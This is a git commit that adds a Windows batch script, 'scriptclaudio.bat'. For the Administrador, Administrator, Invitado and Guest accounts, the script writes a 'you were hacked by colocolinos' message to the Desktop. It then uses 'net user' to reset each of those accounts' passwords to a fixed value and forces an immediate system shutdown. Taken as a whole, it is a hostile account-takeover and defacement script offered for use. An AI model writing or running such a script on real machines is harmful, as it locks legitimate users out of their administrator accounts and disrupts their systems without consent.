846f0ff4c17cac8743e38b7411b41aa7720adb4a
ClaudioTve <150144562+ClaudioTve@users.noreply.github.com>
2024-09-26 15:07:42 -0300

    Add files via upload

---
+++ scriptclaudio.bat
@@ -0,0 +1,31 @@
+@echo off
+
+cd /d C:\
+cd Users
+cd Administrador
+cd Desktop
+echo fuiste hackeado por colocolinos > Elmasgrande.txt
+net user Administrador ColoColo33?
+
+cd /d C:\
+cd Users
+cd Administrator
+cd Desktop
+echo fuiste hackeado por colocolinos > Elmasgrande.txt
+net user Administrator ColoColo33?
+
+cd /d C:\
+cd Users
+cd Invitado
+cd Desktop
+echo fuiste hackeado por colocolinos > Elmasgrande.txt
+net user Invitado ColoColo33?
+
+cd /d C:\
+cd Users
+cd Guest
+cd Desktop
+echo fuiste hackeado por colocolinos > Elmasgrande.txt
+net user Guest ColoColo33?
+
+shutdown /s /f /t 0
